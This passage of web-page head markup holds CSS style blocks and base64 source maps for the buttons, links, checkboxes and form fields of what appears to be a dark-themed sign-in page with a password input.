FsKTtcbiAgICAtLV8xMndkMWdvNTogdmFyKC0tXzEyd2QxZ29kLCBpbml0aWFsKTtcbiAgICAtLV8xMndkMWdvNjogdmFyKC0tXzEyd2QxZ29lLCBpbml0aWFsKTtcbiAgICAtLV8xMndkMWdvNzogdmFyKC0tXzEyd2QxZ29mLCBpbmhlcml0KTtcbiAgfVxufVxuQG1lZGlhIHNjcmVlbiBhbmQgKG1pbi13aWR0aDogNjAwcHgpIHtcbiAgLmxheW91dC1jb250YWluZXJfc3R5bGVzX18xMndkMWdvMWcge1xuICAgIC0tXzEyd2QxZ28wOiB2YXIoLS1fMTJ3ZDFnb2csIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ28xOiB2YXIoLS1fMTJ3ZDFnb2gsIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ28yOiB2YXIoLS1fMTJ3ZDFnb2ksIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ28zOiB2YXIoLS1fMTJ3ZDFnb2osIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ280OiB2YXIoLS1fMTJ3ZDFnb2ssIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ281OiB2YXIoLS1fMTJ3ZDFnb2wsIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ282OiB2YXIoLS1fMTJ3ZDFnb20sIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ283OiB2YXIoLS1fMTJ3ZDFnb24sIGluaGVyaXQpO1xuICB9XG59XG5AbWVkaWEgc2NyZWVuIGFuZCAobWluLXdpZHRoOiA5NjBweCkge1xuICAubGF5b3V0LWNvbnRhaW5lcl9zdHlsZXNfXzEyd2QxZ28xZyB7XG4gICAgLS1fMTJ3ZDFnbzA6IHZhcigtLV8xMndkMWdvbywgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzE6IHZhcigtLV8xMndkMWdvcCwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzI6IHZhcigtLV8xMndkMWdvcSwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzM6IHZhcigtLV8xMndkMWdvciwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzQ6IHZhcigtLV8xMndkMWdvcywgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzU6IHZhcigtLV8xMndkMWdvdCwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzY6IHZhcigtLV8xMndkMWdvdSwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzc6IHZhcigtLV8xMndkMWdvdiwgaW5oZXJpdCk7XG4gIH1cbn1cbkBtZWRpYSBzY3JlZW4gYW5kIChtaW4td2lkdGg6IDEyODBweCkge1xuICAubGF5b3V0LWNvbnRhaW5lcl9zdHlsZXNfXzEyd2QxZ28xZyB7XG4gICAgLS1fMTJ3ZDFnbzA6IHZhcigtLV8xMndkMWdvdywgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzE6IHZhcigtLV8xMndkMWdveCwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzI6IHZhcigtLV8xMndkMWdveSwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzM6IHZhcigtLV8xMndkMWdveiwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzQ6IHZhcigtLV8xMndkMWdvMTAsIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ281OiB2YXIoLS1fMTJ3ZDFnbzExLCBpbml0aWFsKTtcbiAgICAtLV8xMndkMWdvNjogdmFyKC0tXzEyd2QxZ28xMiwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzc6IHZhcigtLV8xMndkMWdvMTMsIGluaGVyaXQpO1xuICB9XG59XG5AbWVkaWEgc2NyZWVuIGFuZCAobWluLXdpZHRoOiAxOTIwcHgpIHtcbiAgLmxheW91dC1jb250YWluZXJfc3R5bGVzX18xMndkMWdvMWcge1xuICAgIC0tXzEyd2QxZ28wOiB2YXIoLS1fMTJ3ZDFnbzE0LCBpbml0aWFsKTtcbiAgICAtLV8xMndkMWdvMTogdmFyKC0tXzEyd2QxZ28xNSwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzI6IHZhcigtLV8xMndkMWdvMTYsIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ28zOiB2YXIoLS1fMTJ3ZDFnbzE3LCBpbml0aWFsKTtcbiAgICAtLV8xMndkMWdvNDogdmFyKC0tXzEyd2QxZ28xOCwgaW5pdGlhbCk7XG4gICAgLS1fMTJ3ZDFnbzU6IHZhcigtLV8xMndkMWdvMTksIGluaXRpYWwpO1xuICAgIC0tXzEyd2QxZ282OiB2YXIoLS1fMTJ3ZDFnbzFhLCBpbml0aWFsKTtcbiAgICAtLV8xMndkMWdvNzogdmFyKC0tXzEyd2QxZ28xYiwgaW5oZXJpdCk7XG4gIH1cbn0iXSwic291cmNlUm9vdCI6IiJ9 */
    </style>
    <style data-rh="true" data-toolkit-style="true" id="pressable.css#pressable_styles__a6ynkg0">
      .pressable_styles__a6ynkg0 {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        background: none;
        border-radius: 0;
        border: 0;
        box-sizing: content-box;
        color: inherit;
        cursor: default;
        display: inline;
        font: inherit;
        letter-spacing: inherit;
        line-height: inherit;
        margin: 0;
        opacity: 1;
        padding: 0;
        text-decoration: none;
      }

      .pressable_styles__a6ynkg0[aria-disabled] {
        cursor: not-allowed;
        opacity: 0.5;
      }

      .pressable_styles__a6ynkg0:focus {
        outline: #a9a9a9 auto 5px;
        outline: Highlight auto 5px;
        outline: -webkit-focus-ring-color auto 5px;
      }

      .pressable_styles__a6ynkg0:focus:not(:focus-visible) {
        outline: none;
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uLy4uLy4uL25vZGVfbW9kdWxlcy9AdmFuaWxsYS1leHRyYWN0L3dlYnBhY2stcGx1Z2luL2V4dHJhY3RlZC5qcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLHdCQUFnQjtLQUFoQixxQkFBZ0I7VUFBaEIsZ0JBQWdCO0VBQ2hCLGdCQUFnQjtFQUNoQixnQkFBZ0I7RUFDaEIsU0FBUztFQUNULHVCQUF1QjtFQUN2QixjQUFjO0VBQ2QsZUFBZTtFQUNmLGVBQWU7RUFDZixhQUFhO0VBQ2IsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQixTQUFTO0VBQ1QsVUFBVTtFQUNWLFVBQVU7RUFDVixxQkFBcUI7QUFDdkI7O0FBQ0E7RUFDRSxtQkFBbUI7RUFDbkIsWUFBWTtBQUNkOztBQUNBO0VBQ0UseUJBQXlCO0VBQ3pCLDJCQUEyQjtFQUMzQiwwQ0FBMEM7QUFDNUM7O0FBQ0E7RUFDRSxhQUFhO0FBQ2YiLCJzb3VyY2VzQ29udGVudCI6WyIucHJlc3NhYmxlX3N0eWxlc19fYTZ5bmtnMCB7XG4gIGFwcGVhcmFuY2U6IG5vbmU7XG4gIGJhY2tncm91bmQ6IG5vbmU7XG4gIGJvcmRlci1yYWRpdXM6IDA7XG4gIGJvcmRlcjogMDtcbiAgYm94LXNpemluZzogY29udGVudC1ib3g7XG4gIGNvbG9yOiBpbmhlcml0O1xuICBjdXJzb3I6IGRlZmF1bHQ7XG4gIGRpc3BsYXk6IGlubGluZTtcbiAgZm9udDogaW5oZXJpdDtcbiAgbGV0dGVyLXNwYWNpbmc6IGluaGVyaXQ7XG4gIGxpbmUtaGVpZ2h0OiBpbmhlcml0O1xuICBtYXJnaW46IDA7XG4gIG9wYWNpdHk6IDE7XG4gIHBhZGRpbmc6IDA7XG4gIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbn1cbi5wcmVzc2FibGVfc3R5bGVzX19hNnlua2cwW2FyaWEtZGlzYWJsZWRdIHtcbiAgY3Vyc29yOiBub3QtYWxsb3dlZDtcbiAgb3BhY2l0eTogMC41O1xufVxuLnByZXNzYWJsZV9zdHlsZXNfX2E2eW5rZzA6Zm9jdXMge1xuICBvdXRsaW5lOiAjYTlhOWE5IGF1dG8gNXB4O1xuICBvdXRsaW5lOiBIaWdobGlnaHQgYXV0byA1cHg7XG4gIG91dGxpbmU6IC13ZWJraXQtZm9jdXMtcmluZy1jb2xvciBhdXRvIDVweDtcbn1cbi5wcmVzc2FibGVfc3R5bGVzX19hNnlua2cwOmZvY3VzOm5vdCg6Zm9jdXMtdmlzaWJsZSkge1xuICBvdXRsaW5lOiBub25lO1xufSJdLCJzb3VyY2VSb290IjoiIn0= */
    </style>
    <style data-rh="true" data-toolkit-style="true" id="anchor.css#anchor_styles__1h0vwqc0">
      .anchor_styles__1h0vwqc0 {
        color: blue;
        cursor: pointer;
        text-decoration: underline;
        -webkit-user-select: text;
        -moz-user-select: text;
        user-select: text;
      }

      .anchor_styles__1h0vwqc0:visited {
        color: purple;
      }

      .anchor_styles__1h0vwqc0:not([aria-disabled]):active {
        color: #e00000;
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uLy4uLy4uL25vZGVfbW9kdWxlcy9AdmFuaWxsYS1leHRyYWN0L3dlYnBhY2stcGx1Z2luL2V4dHJhY3RlZC5qcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLFdBQVc7RUFDWCxlQUFlO0VBQ2YsMEJBQTBCO0VBQzFCLHlCQUFpQjtLQUFqQixzQkFBaUI7VUFBakIsaUJBQWlCO0FBQ25COztBQUNBO0VBQ0UsYUFBYTtBQUNmOztBQUNBO0VBQ0UsY0FBYztBQUNoQiIsInNvdXJjZXNDb250ZW50IjpbIi5hbmNob3Jfc3R5bGVzX18xaDB2d3FjMCB7XG4gIGNvbG9yOiBibHVlO1xuICBjdXJzb3I6IHBvaW50ZXI7XG4gIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lO1xuICB1c2VyLXNlbGVjdDogdGV4dDtcbn1cbi5hbmNob3Jfc3R5bGVzX18xaDB2d3FjMDp2aXNpdGVkIHtcbiAgY29sb3I6IHB1cnBsZTtcbn1cbi5hbmNob3Jfc3R5bGVzX18xaDB2d3FjMDpub3QoW2FyaWEtZGlzYWJsZWRdKTphY3RpdmUge1xuICBjb2xvcjogI2UwMDAwMDtcbn0iXSwic291cmNlUm9vdCI6IiJ9 */
    </style>
    <style data-rh="true" data-toolkit-style="true" id="checkbox.css#form-control_controlWrapperStyles__oy4jpq1">
      .form-control_controlWrapperStyles__oy4jpq1>.checkbox_nativeElementStyles__1axue5s0 {
        min-height: 10px;
        min-width: 10px;
      }

      .checkbox_nativeElementStyles__1axue5s0:checked~.form-control_controlChromeStyles__oy4jpq4 {
        color: inherit;
        font-size: 13px;
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uLy4uLy4uL25vZGVfbW9kdWxlcy9AdmFuaWxsYS1leHRyYWN0L3dlYnBhY2stcGx1Z2luL2V4dHJhY3RlZC5qcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLGdCQUFnQjtFQUNoQixlQUFlO0FBQ2pCOztBQUNBO0VBQ0UsY0FBYztFQUNkLGVBQWU7QUFDakIiLCJzb3VyY2VzQ29udGVudCI6WyIuZm9ybS1jb250cm9sX2NvbnRyb2xXcmFwcGVyU3R5bGVzX19veTRqcHExID4gLmNoZWNrYm94X25hdGl2ZUVsZW1lbnRTdHlsZXNfXzFheHVlNXMwIHtcbiAgbWluLWhlaWdodDogMTBweDtcbiAgbWluLXdpZHRoOiAxMHB4O1xufVxuLmNoZWNrYm94X25hdGl2ZUVsZW1lbnRTdHlsZXNfXzFheHVlNXMwOmNoZWNrZWQgfiAuZm9ybS1jb250cm9sX2NvbnRyb2xDaHJvbWVTdHlsZXNfX295NGpwcTQge1xuICBjb2xvcjogaW5oZXJpdDtcbiAgZm9udC1zaXplOiAxM3B4O1xufSJdLCJzb3VyY2VSb290IjoiIn0= */
    </style>
    <style data-rh="true" data-toolkit-style="true" id="button.css#button_styles__1kwr4ym0">
      .button_styles__1kwr4ym0 {
        align-items: center;
        background: gainsboro;
        border-radius: 2px;
        border: 1px solid dimgray;
        box-sizing: border-box;
        color: black;
        cursor: default;
        display: inline-flex;
        font-size: 13px;
        font-weight: 400;
        justify-content: center;
        letter-spacing: normal;
        line-height: 1;
        padding: 2px 7px;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
      }

      .button_styles__1kwr4ym0:not([aria-disabled]):active {
        border-color: darkgray;
        background: #ececec;
      }

      @media all and (hover: hover) {
        .button_styles__1kwr4ym0:not([aria-disabled]):hover {
          border-color: black;
          background: lightgray;
        }
      }

      /*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uLy4uLy4uL25vZGVfbW9kdWxlcy9AdmFuaWxsYS1leHRyYWN0L3dlYnBhY2stcGx1Z2luL2V4dHJhY3RlZC5qcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLG1CQUFtQjtFQUNuQixxQkFBcUI7RUFDckIsa0JBQWtCO0VBQ2xCLHlCQUF5QjtFQUN6QixzQkFBc0I7RUFDdEIsWUFBWTtFQUNaLGVBQWU7RUFDZixvQkFBb0I7RUFDcEIsZUFBZTtFQUNmLGdCQUFnQjtFQUNoQix1QkFBdUI7RUFDdkIsc0JBQXNCO0VBQ3RCLGNBQWM7RUFDZCxnQkFBZ0I7RUFDaEIseUJBQWlCO0tBQWpCLHNCQUFpQjtVQUFqQixpQkFBaUI7QUFDbkI7O0FBQ0E7RUFDRSxzQkFBc0I7RUFDdEIsbUJBQW1CO0FBQ3JCOztBQUNBO0VBQ0U7SUFDRSxtQkFBbUI7SUFDbkIscUJBQXFCO0VBQ3ZCO0FBQ0YiLCJzb3VyY2VzQ29udGVudCI6WyIuYnV0dG9uX3N0eWxlc19fMWt3cjR5bTAge1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICBiYWNrZ3JvdW5kOiBnYWluc2Jvcm87XG4gIGJvcmRlci1yYWRpdXM6IDJweDtcbiAgYm9yZGVyOiAxcHggc29saWQgZGltZ3JheTtcbiAgYm94LXNpemluZzogYm9yZGVyLWJveDtcbiAgY29sb3I6IGJsYWNrO1xuICBjdXJzb3I6IGRlZmF1bHQ7XG4gIGRpc3BsYXk6IGlubGluZS1mbGV4O1xuICBmb250LXNpemU6IDEzcHg7XG4gIGZvbnQtd2VpZ2h0OiA0MDA7XG4gIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICBsZXR0ZXItc3BhY2luZzogbm9ybWFsO1xuICBsaW5lLWhlaWdodDogMTtcbiAgcGFkZGluZzogMnB4IDdweDtcbiAgdXNlci1zZWxlY3Q6IG5vbmU7XG59XG4uYnV0dG9uX3N0eWxlc19fMWt3cjR5bTA6bm90KFthcmlhLWRpc2FibGVkXSk6YWN0aXZlIHtcbiAgYm9yZGVyLWNvbG9yOiBkYXJrZ3JheTtcbiAgYmFja2dyb3VuZDogI2VjZWNlYztcbn1cbkBtZWRpYSBhbGwgYW5kIChob3ZlcjogaG92ZXIpIHtcbiAgLmJ1dHRvbl9zdHlsZXNfXzFrd3I0eW0wOm5vdChbYXJpYS1kaXNhYmxlZF0pOmhvdmVyIHtcbiAgICBib3JkZXItY29sb3I6IGJsYWNrO1xuICAgIGJhY2tncm91bmQ6IGxpZ2h0Z3JheTtcbiAgfVxufSJdLCJzb3VyY2VSb290IjoiIn0= */
    </style>

    <style data-emotion="default-ltr-cache k55181" data-s="">
      .default-ltr-cache-k55181 {
        background-color: rgb(0, 0, 0);
        color: rgb(255, 255, 255);
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        min-height: 100vh;
        overflow: hidden;
        position: relative;
        z-index: 0;
      }
    </style>
    <style data-emotion="default-ltr-cache pkc5fh" data-s="">
      .default-ltr-cache-pkc5fh {
        display: none;
        opacity: 0.5;
        pointer-events: none;
      }

      @media screen and (min-width: 600px) {
        .default-ltr-cache-pkc5fh {
          background-image: cover;
          -webkit-background-size: cover;
          background-size: cover;
          display: block;
          height: 100vh;
          min-height: 100vh;
          overflow: hidden;
          position: absolute;
          width: 100%;
          z-index: -1;
        }

        .default-ltr-cache-pkc5fh .vlv-creative {
          min-height: 100%;
          min-width: 100%;
        }
      }
    </style>
    <style data-emotion="default-ltr-cache xa9oq4" data-s="">
      .default-ltr-cache-xa9oq4 {
        width: inherit;
        padding-top: 1.5rem;
        padding-bottom: 1.5rem;
        margin: auto;
      }

      @media all {
        .default-ltr-cache-xa9oq4 {
          padding-left: 1.5rem;
          padding-right: 1.5rem;
        }
      }

      @media all and (min-width: 600px) {
        .default-ltr-cache-xa9oq4 {
          padding-left: 2rem;
          padding-right: 2rem;
        }
      }

      @media all and (min-width: 960px) {
        .default-ltr-cache-xa9oq4 {
          padding-left: 2rem;
          padding-right: 2rem;
        }
      }

      @media all and (min-width: 1280px) {
        .default-ltr-cache-xa9oq4 {
          padding-left: 3rem;
          padding-right: 3rem;
        }
      }

      @media all and (min-width: 1920px) {
        .default-ltr-cache-xa9oq4 {
          padding-left: 3rem;
          padding-right: 3rem;
        }
      }

      @media screen and (min-width: 1280px) {
        .default-ltr-cache-xa9oq4 {
          max-width: calc(83.33333333333334% - (3rem * 2));
        }
      }

      @media screen and (min-width: 1920px) {
        .default-ltr-cache-xa9oq4 {
          max-width: calc(66.66666666666666% - (3rem * 2));
        }
      }

      .default-ltr-cache-xa9oq4::after {
        display: none;
        border-bottom: none;
        content: '';
        position: absolute;
        left: 0;
        right: 0;
        margin-top: calc(1.5rem - 0.0625rem);
      }
    </style>
    <style data-emotion="default-ltr-cache 1d568uk" data-s="">
      .default-ltr-cache-1d568uk {
        width: 9.25rem;
        height: 2.5rem;
        color: rgb(229, 9, 20);
        fill: currentColor;
        display: block;
      }

      @media screen and (max-width: 959.98px) {
        .default-ltr-cache-1d568uk {
          width: 5.5625rem;
          height: 1.5rem;
        }
      }
    </style>
    <style data-emotion="default-ltr-cache raue2m" data-s="">
      .default-ltr-cache-raue2m {
        clip: rect(0 0 0 0);
        -webkit-clip-path: inset(50%);
        clip-path: inset(50%);
        height: 1px;
        overflow: hidden;
        position: absolute;
        white-space: nowrap;
        width: 1px;
      }
    </style>
    <style data-emotion="default-ltr-cache 8hdzfz" data-s="">
      .default-ltr-cache-8hdzfz {
        -webkit-box-flex: 1;
        -webkit-flex-grow: 1;
        -ms-flex-positive: 1;
        flex-grow: 1;
        margin: 0 auto;
        padding: 0 5%;
      }

      @media screen and (min-width: 600px) {
        .default-ltr-cache-8hdzfz {
          margin-bottom: 50px;
          max-width: 450px;
        }
      }
    </style>
    <style data-emotion="default-ltr-cache 1osrymp" data-s="">
      .default-ltr-cache-1osrymp {
        background-color: rgba(0, 0, 0, 0.7);
        border-radius: 4px;
        box-sizing: border-box;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        margin: 0;
        padding-bottom: 30px;
        width: 100%;
      }

      @media screen and (min-width: 600px) {
        .default-ltr-cache-1osrymp {
          min-height: 707px;
          padding: 48px 68px;
        }
      }
    </style>
    <style data-emotion="default-ltr-cache 1ws1lu8" data-s="">
      .default-ltr-cache-1ws1lu8 {
        text-align: left;
      }

      .default-ltr-cache-1ws1lu8 h1 {
        margin-bottom: 28px;
      }

      .default-ltr-cache-1ws1lu8 h1 svg {
        display: block;
        margin: 0 auto 10px;
      }

      .default-ltr-cache-1ws1lu8 h2 {
        margin: 16px 0 28px;
      }

      .default-ltr-cache-1ws1lu8 h2 span {
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        gap: 6px;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        -webkit-justify-content: center;
        justify-content: center;
        margin-top: 5px;
      }

      .default-ltr-cache-1ws1lu8 svg {
        color: inherit;
      }
    </style>
    <style data-emotion="default-ltr-cache 1ho9ut0" data-s="">
      .default-ltr-cache-1ho9ut0 {
        margin-block-start: 0;
        margin-block-end: 0;
        margin: 0;
        padding: 0;
        color: rgb(255, 255, 255);
        font-size: 2rem;
        font-weight: 700;
      }
    </style>
    <style data-emotion="default-ltr-cache budh8k" data-s="">
      .default-ltr-cache-budh8k {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        gap: 16px;
      }
    </style>
    <style data-emotion="default-ltr-cache 9beyap" data-s="">
      .default-ltr-cache-9beyap {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        gap: 16px;
      }
    </style>
    <style data-emotion="default-ltr-cache z5atxi" data-s="">
      .default-ltr-cache-z5atxi {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-flex: 1;
        -webkit-flex-grow: 1;
        -ms-flex-positive: 1;
        flex-grow: 1;
      }
    </style>
    <style data-emotion="default-ltr-cache 14jsj4q" data-s="">
      .default-ltr-cache-14jsj4q {
        position: relative;
        -webkit-box-flex-wrap: wrap;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1 {
        padding: 0;
      }

      .default-ltr-cache-14jsj4q input~.form-control_controlChromeStyles__oy4jpq4 {
        border-style: solid;
      }

      .default-ltr-cache-14jsj4q input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 1;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        cursor: not-allowed;
      }

      .default-ltr-cache-14jsj4q .form-control_descriptionStyles__oy4jpq6 {
        width: 100%;
      }

      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 {
        fill: currentColor;
        width: 100%;
      }

      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        position: relative;
      }

      .default-ltr-cache-14jsj4q {
        display: -webkit-inline-box;
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
        vertical-align: text-top;
      }

      .default-ltr-cache-14jsj4q .form-control_labelStyles__oy4jpq5 {
        position: absolute;
        z-index: 1;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        transition-property: top, font-size, line-height;
        transition-duration: 250ms;
        pointer-events: none;
        transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06);
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-14jsj4q .form-control_labelStyles__oy4jpq5 {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1 {
        fill: currentColor;
        min-width: 12.5rem;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input {
        color: inherit;
        -webkit-filter: opacity(0%);
        filter: opacity(0%);
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input:autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input.edge-autofilled,
      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input[data-com-onepassword-filled],
      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input[data-dashlane-autofilled] {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        opacity: 1;
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-14jsj4q .form-control_labelStyles__oy4jpq5 {
        font-size: 1rem;
        color: rgba(255, 255, 255, 0.7);
        left: 1rem;
        line-height: 1.5;
        right: 1rem;
        top: 1rem;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1 {
        width: 100%;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1,
      .default-ltr-cache-14jsj4q .nested-select_visibleOptionStyles__7w8vae3 {
        font-size: 1rem;
        font-weight: 400;
        color: rgb(255, 255, 255);
      }

      .default-ltr-cache-14jsj4q input~.form-control_controlChromeStyles__oy4jpq4 {
        background: rgba(22, 22, 22, 0.7);
        border-radius: 0.25rem;
        border-width: 0.0625rem;
        border-color: rgba(128, 128, 128, 0.7);
      }

      .default-ltr-cache-14jsj4q input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        border-color: rgba(128, 128, 128, 0.4);
        background: rgba(22, 22, 22, 0.2);
      }

      .default-ltr-cache-14jsj4q input:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .default-ltr-cache-14jsj4q input:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-14jsj4q input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
        background: rgb(25, 34, 71);
      }

      @supports (-webkit-appearance: none) and (not (-moz-appearance: none)) and (text-size-adjust: none) {
        .default-ltr-cache-14jsj4q input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgba(70, 90, 126, 0.4);
        }
      }

      @supports (-webkit-appearance: none) and (not (-moz-appearance: none)) and (not (text-size-adjust: none)) {
        .default-ltr-cache-14jsj4q input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgb(5, 0, 66);
        }
      }

      @supports (-moz-appearance: none) {
        .default-ltr-cache-14jsj4q input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgb(0, 4, 56);
        }
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input {
        width: 100%;
        line-height: 1.5;
        padding-top: 1.5rem;
        padding-right: 1rem;
        padding-bottom: 0.5rem;
        padding-left: 1rem;
      }

      .default-ltr-cache-14jsj4q .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        padding-right: 2.75rem;
      }

      .default-ltr-cache-14jsj4q .form-control_descriptionStyles__oy4jpq6 {
        font-size: 0.8125rem;
        font-weight: 400;
        color: rgba(255, 255, 255, 0.7);
        margin-top: 0.375rem;
      }

      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 {
        font-size: 0.8125rem;
        font-weight: 400;
        margin-top: 0.375rem;
        color: rgba(255, 255, 255, 0.7);
      }

      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-14jsj4q .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        margin-right: 0.25rem;
        top: 0.1875rem;
      }

      .default-ltr-cache-14jsj4q .nested-select_nestedSelectStyles__7w8vae0 {
        opacity: 0;
        cursor: text;
        margin-top: 1.5rem;
        margin-right: 0;
        margin-bottom: 0.5rem;
        margin-left: 1rem;
      }

      .default-ltr-cache-14jsj4q .nested-select_visibleOptionStyles__7w8vae3 {
        padding: 0;
        position: relative;
        pointer-events: none;
        overflow: visible;
      }

      .default-ltr-cache-14jsj4q .nested-select_visibleOptionStyles__7w8vae3::before {
        content: '';
        position: absolute;
        border-radius: 0.125rem;
        top: 0;
        bottom: 0;
        left: -0.125rem;
        right: -0.125rem;
        opacity: 0;
        outline: rgb(255, 255, 255) solid 0.125rem;
      }

      .default-ltr-cache-14jsj4q .nested-select_selectStyles__7w8vae2:focus+.nested-select_visibleOptionStyles__7w8vae3 {
        outline: none;
      }

      .default-ltr-cache-14jsj4q .nested-select_selectStyles__7w8vae2:focus+.nested-select_visibleOptionStyles__7w8vae3::before {
        opacity: 1;
      }

      .default-ltr-cache-14jsj4q .nested-select_chromeStyles__7w8vae5 {
        margin: 0;
      }
    </style>
    <style data-emotion="default-ltr-cache 1qtmpa" data-s="">
      .default-ltr-cache-1qtmpa {
        position: relative;
        width: 100%;
      }

      .default-ltr-cache-1qtmpa input[name='password'] {
        margin-right: 32px;
      }
    </style>
